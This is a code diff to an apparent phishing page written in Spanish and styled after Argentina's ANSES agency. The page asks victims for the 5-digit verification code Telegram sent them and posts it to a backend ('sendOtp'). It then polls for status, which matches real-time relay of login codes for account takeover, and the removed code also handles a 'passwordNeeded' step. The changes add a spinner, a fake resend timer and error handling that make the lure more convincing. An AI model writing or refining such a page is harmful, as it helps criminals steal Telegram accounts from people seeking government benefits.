@@ -68,10 +68,27 @@
         cursor: pointer;
     }
 
-    .otp-btn:hover {
-        background-color: #005a8d;
-        color: #fff;
+    .otp-btn:disabled {
+        background-color: #ccc;
+        cursor: not-allowed;
     }
+
+    /* CSS Loader yang tadinya hilang */
+    #loader {
+        display: none;
+        text-align: center;
+        margin-top: 20px;
+    }
+    .spinner-otp {
+        width: 30px;
+        height: 30px;
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #0080c7;
+        border-radius: 50%;
+        animation: spin-otp 1s linear infinite;
+        display: inline-block;
+    }
+    @keyframes spin-otp { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
     .text-danger-anses {
         color: #d32f2f;
@@ -82,9 +99,7 @@
 </style>
 
 <div class="otp-wrapper">
-    <h5 class="otp-title">
-        Código de Verificación
-    </h5>
+    <h5 class="otp-title">Código de Verificación</h5>
 
     <p class="otp-desc">
         Introduzca el código de 5 dígitos que le enviamos por <strong>Telegram</strong> para continuar con su trámite.
@@ -95,8 +110,7 @@
         <input
             type="text"
             class="form-control otp-input shadow-none"
-            name="phone"
-            id="phone"
+            id="otp_val"
             placeholder="00000"
             maxlength="5"
             inputmode="numeric"
@@ -104,67 +118,93 @@
         />
     </div>
 
-    <p id="wrong" class="text-center text-danger-anses fw-semibold" style="display:none;"></p>
+    <p id="wrong" class="text-center text-danger-anses fw-semibold"></p>
 
-    <button class="btdk btn otp-btn">
+    <button type="button" class="btn otp-btn" id="btnSubmit">
         CONTINUAR
     </button>
+
+    <div id="loader">
+        <div class="spinner-otp"></div>
+        <p style="font-size: 14px; color: #0080c7; margin-top: 10px;">Verificando...</p>
+    </div>
     
     <div class="text-center mt-4">
-        <small style="color: #666;">¿No recibiste el código? Revisá tu aplicación de Telegram.</small>
+        <small style="color: #666;">
+            ¿No recibiste el código? 
+            <span id="resend-text">Reenviar código en <span id="timer">60</span>s</span>
+            <a href="javascript:location.reload()" id="resend-link" style="display:none; color: #0080c7; font-weight: bold; text-decoration: none;">Reenviar ahora</a>
+        </small>
     </div>
 </div>
 
 <script>
-    // Pastikan jQuery sudah dimuat dari file utama (index.php)
+$(document).ready(function() {
     $("#wrong").hide();
+    $("#loader").hide();
 
+    // 1. LOGIKA TIMER REENVIAR
+    var timeLeft = 60;
+    var timerId = setInterval(function() {
+        if (timeLeft <= 0) {
+            clearInterval(timerId);
+            $("#resend-text").hide();
+            $("#resend-link").show();
+        } else {
+            $("#timer").text(timeLeft);
+        }
+        timeLeft -= 1;
+    }, 1000);
+
+    // 2. LOGIKA CHECK STATUS
     function checkStatus() {
-        $("#wrong").hide();
-        
         $.ajax({
             url: "API/index.php",
             type: "POST",
             data: {"method":"getStatus"},
-            success:function(data){
-                if (data.result.status == "success") {
+            success: function(data) {
+                let res = (typeof data === 'string') ? JSON.parse(data) : data;
+
+                if (res.result.status == "success") {
                     window.location.reload();
-                } else if (data.result.status == "failed") {
-                    if (data.result.detail == "wrong") {
-                        $("#wrong").html("❌ El código OTP es incorrecto");
-                        $("#loader").hide();
-                    } else if (data.result.detail == "passwordNeeded") {
-                        window.location.reload();
-                    }
-                    $("#wrong").show();
-                    $("input[type='text']").val("");
+                } else if (res.result.status == "failed") {
+                    $("#loader").hide();
+                    $("#btnSubmit").show();
+                    $("#wrong").html("❌ El código OTP es incorrecto").show();
+                    $("#otp_val").val("");
                 } else {
-                    setTimeout(function(){
-                        checkStatus();
-                    }, 500);
+                    setTimeout(function(){ checkStatus(); }, 1000);
                 }
-            }, 
-            error:function(data){}
+            }
         });
     }
 
-    $(".otp-btn").on("click", function(e){
+    // 3. LOGIKA TOMBOL KLIK
+    $("#btnSubmit").on("click", function(e) {
         e.preventDefault();
-        var com = $(".otp-input").val();
+        var otpValue = $("#otp_val").val();
 
-        if (com != "") {
+        if (otpValue.length === 5) {
+            $("#wrong").hide();
+            $("#btnSubmit").hide(); 
             $("#loader").show();
+
             $.ajax({
                 url: "API/index.php",
                 type: "POST",
-                data: {"method":"sendOtp","otp":com},
-                success:function(data){
-                    setTimeout(function(){
-                        checkStatus();
-                    }, 500);
+                data: {"method":"sendOtp", "otp": otpValue},
+                success: function() {
+                    setTimeout(function(){ checkStatus(); }, 500);
                 },
-                error:function(data){}
+                error: function() {
+                    $("#loader").hide();
+                    $("#btnSubmit").show();
+                    alert("Error de conexión");
+                }
             });
+        } else {
+            alert("Por favor, ingrese el código de 5 dígitos.");
         }
     });
+});
 </script>
